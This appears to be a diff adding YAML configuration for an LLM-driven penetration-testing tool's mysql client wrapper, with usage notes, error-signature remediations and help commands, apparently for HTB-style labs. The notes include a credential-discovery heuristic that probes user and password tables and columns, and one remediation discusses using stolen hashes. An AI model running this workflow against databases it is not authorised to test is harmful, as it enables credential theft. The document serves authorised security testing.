+  - "SSL OPTIONS ON MYSQL 8 USE --ssl-mode= — older mysql 5.x used `--ssl=REQUIRED` (single dash, no -mode suffix), which is DEPRECATED in 8.x. Newer clients accept --ssl-mode=; older servers may not understand it (but they will accept the connection without it). Always use --ssl-mode= with newer clients."
+  - "Feature 28 dynamic recipes are RETIRED for the kind:cli path — the LLM writes argv directly. Recipes still load for legacy method calls (query, list_databases, list_tables, dump_table, find_credentials) if /session/tool_recipes/mysql/ exists, but they're a dead branch under run_cli (REQ-TR-016)."
+  - "EXIT CODES — mysql client exits 0 on successful query (even if 0 rows returned), 1 on connection failure, 1 on auth failure, 1 on syntax error. The exit code does NOT distinguish 'connected but query returned an error' from 'failed to connect' — pattern-match stderr signals (failure_signatures table)."
+  - "CREDENTIAL-DISCOVERY HEURISTIC (from legacy find_credentials method) — common table-name patterns to probe: `users`, `accounts`, `members`, `admin`, `credentials`, `wp_users` (WordPress), `user`. Common credential column patterns: `username`, `password`, `email`, `user_login`, `user_pass`, `user_email`, `pass`, `pwd`. Skip system schemas (`information_schema`, `mysql`, `performance_schema`, `sys`) when iterating user databases. The legacy method orchestrated SHOW DATABASES → SHOW TABLES → SELECT * FROM matching tables; the LLM should now construct this multi-step workflow explicitly."
+
+failure_signatures:
+  # Layer-diverse signals (SKILL #11) — at least 7 distinct verifiable layers:
+  #   1. DNS  2. TCP  3. Authentication  4. SSL/TLS  5. Database scope
+  #   6. SQL syntax  7. Privilege  8. Argument parsing
+  - signal: "Unknown MySQL server host"
+    remediation: "DNS resolution failed for the -h host. Verify hostname spelling, try IP literal, check container DNS (`/etc/resolv.conf`). On HTB/lab, ensure VPN tun0 is up and routes the target subnet."
+  - signal: "Can't resolve hostname"
+    remediation: "DNS unreachable — same root as 'Unknown MySQL server host'. Pass an IP to -h instead of a hostname, or fix container DNS."
+  - signal: "Can't connect to MySQL server"
+    remediation: "TCP connection failed — server unreachable on -h:-P (default 3306). Verify with `nmap -p 3306 <host>` (port open?), check VPN routing, confirm the server is bound to 0.0.0.0 not just 127.0.0.1 (`bind-address` in mysqld.cnf). Test from another tool: `nc -vz <host> 3306`."
+  - signal: "Connection refused"
+    remediation: "TCP refused — port closed or filtered. nmap-confirm port state; if filtered, suspect host firewall or external ACL. The mysql server may be listening on a non-default port (e.g., 13306, 3307); try `-P 3307` or scan with -sV."
+  - signal: "Connection timed out"
+    remediation: "TCP connection didn't complete within the kernel timeout — usually packet drops on the network path. Check VPN tunnel (`ip route`, `ping <host>`), check for an intermediate firewall silently dropping. mysql client doesn't have a connect-timeout flag like sqlmap; rely on kernel default (~75s) or wrap in `timeout 10 mysql ...`."
+  - signal: "Access denied for user"
+    remediation: "Authentication failure — wrong password, wrong user, wrong source host (the user is locked to a specific source IP via `user@source_ip`). Verify: (a) password format `-pSecret` no space; (b) `--password=Secret` if -p is fragile; (c) user grants — `SHOW GRANTS FOR 'user'@'%'` or `'user'@'<your-ip>'`. MySQL grants are PER source — `app_user@10.0.0.5` cannot login from `10.0.0.6`."
+  - signal: "Unknown database"
+    remediation: "The -D database name doesn't exist OR the auth user lacks SELECT permission on it. `SHOW DATABASES` to see what's accessible; root sees all, app users see only their granted DBs. CASE matters on Linux mysqld (default lower_case_table_names=0); 'AppDB' and 'appdb' are different."
+  - signal: "doesn't exist"
+    remediation: "Generic 'object not found' — table, view, or column. `SHOW TABLES IN <db>` to confirm; `DESCRIBE <table>` to confirm columns. Note: some legacy MySQL forks have `password` column on mysql.user; modern MySQL 5.7+ has `authentication_string`."
+  - signal: "command denied to user"
+    remediation: "Privilege failure — the auth user can connect and SELECT some objects but lacks the privilege for the specific operation. `SHOW GRANTS FOR CURRENT_USER()` to see available privileges. Common: missing FILE for LOAD_FILE / INTO OUTFILE; missing SUPER for SET GLOBAL; missing PROCESS for SHOW PROCESSLIST of other users' threads."
+  - signal: "INSUFFICIENT_PRIVILEGES"
+    remediation: "Synonym for 'command denied to user' on some MariaDB versions. Same root cause: privilege missing from grants. Check current grants and request the privilege if you control the grant chain."
+  - signal: "SSL connection error"
+    remediation: "TLS handshake failed. Common causes: (a) MySQL 8 server requires TLS but client tries plaintext — pass `--ssl-mode=REQUIRED`; (b) MySQL 5.x server doesn't support newer TLS — pass `--ssl-mode=DISABLED` to force plaintext; (c) cert verification failed — pass `--ssl-mode=REQUIRED` (no verify) for lab use, or `--ssl-ca=/path` for production verify."
+  - signal: "TLS handshake failed"
+    remediation: "Synonym for 'SSL connection error'. Same fixes: --ssl-mode=DISABLED for legacy, --ssl-mode=REQUIRED for modern, --ssl-ca for verified."
+  - signal: "ERROR 2026"
+    remediation: "Generic mysql_real_connect SSL error code (libmysqlclient error 2026). Always TLS-related. Try --ssl-mode=DISABLED first to verify the underlying server is reachable; then debug TLS separately."
+  - signal: "ERROR 2003"
+    remediation: "Can't connect to MySQL server (general network failure code). Same root as 'Can't connect to MySQL server' — TCP-layer issue, port closed/filtered/unreachable."
+  - signal: "ERROR 1045"
+    remediation: "Access denied for user (numeric form). Same as 'Access denied for user' string — password / user / source-IP issue."
+  - signal: "ERROR 1049"
+    remediation: "Unknown database (numeric form). Same fix as 'Unknown database': verify DB name with SHOW DATABASES."
+  - signal: "ERROR 1142"
+    remediation: "command denied to user (numeric form). Privilege issue — see SHOW GRANTS."
+  - signal: "syntax error"
+    remediation: "SQL syntax error in the -e query. Read prior log lines for the column position. Common: missing semicolon between multi-statements, unquoted strings with apostrophes, MariaDB-specific syntax on Oracle MySQL or vice versa, reserved words used as column names without backticks."
+  - signal: "You have an error in your SQL syntax"
+    remediation: "Synonym for 'syntax error' — full mysql phrasing. Same fix: re-read query, watch for missing quotes / commas / parens."
+  - signal: "Unknown option"
+    remediation: "argparse — unknown flag. Check dashes (mysql uses both single and double dash long forms — `-host` is INVALID, must be either `-h <host>` or `--host=<host>`). Common typo: `--ssl-mode` written as `--sslmode` or `-ssl-mode`."
+  - signal: "ambiguous option"
+    remediation: "argparse — partial long-flag matched multiple flags (mysql allows long-flag prefix matching). Disambiguate by writing the full flag name. Example: `--def` could match `--defaults-file` and `--default-character-set`."
+  - signal: "Aborted connection"
+    remediation: "Server closed the connection mid-stream — usually wait_timeout / interactive_timeout exceeded, or a firewall stateful inspection drop. For long queries, increase server-side wait_timeout via `SET SESSION wait_timeout=600` in --init-command. For network drops, retry; if persistent, check for an intermediate firewall."
+  - signal: "Lost connection to MySQL server"
+    remediation: "TCP RST or timeout mid-query. Same root as 'Aborted connection'. Retry; for repeated failures on big queries, reduce LIMIT or use server-side cursor (declarative LIMIT batches)."
+  - signal: "Wrong hash format"
+    remediation: "Not actually a mysql client error — but appears if you tried to use a hashed password as the cleartext via -p. mysql expects CLEARTEXT for -p, not the stored hash. To use a stolen hash, you need PtH-style Kerberos (not MySQL-native) or to crack the hash first."
+  - signal: "Local infile disabled"
+    remediation: "LOAD DATA LOCAL INFILE was used but the client has --local-infile=0 (default in MySQL 8+ for security). Pass `--local-infile=1` to enable, or use the server-side LOAD DATA INFILE (no LOCAL keyword) which reads from the server's filesystem instead."
+
+help_commands:
+  - command: "mysql --help"
+    purpose: "Top-level help — lists all flags including connection (-h/-P/-u/-p/-S), execution (-e/-D), output (-B/-N/-s/-r), SSL (--ssl-mode/--ssl-ca/--ssl-cert/--ssl-key), and defaults files (--no-defaults/--defaults-file). Includes the loaded my.cnf paths and the client-default values for each flag at the end."
+  - command: "mysql --version"
+    purpose: "Print version string. Used to distinguish mariadb client (`mysql Ver 15.1 Distrib 10.x-MariaDB`) from Oracle MySQL client (`mysql Ver 8.0.x for Linux`). The variant determines which flags are available (e.g., --xml is mariadb-only)."
+
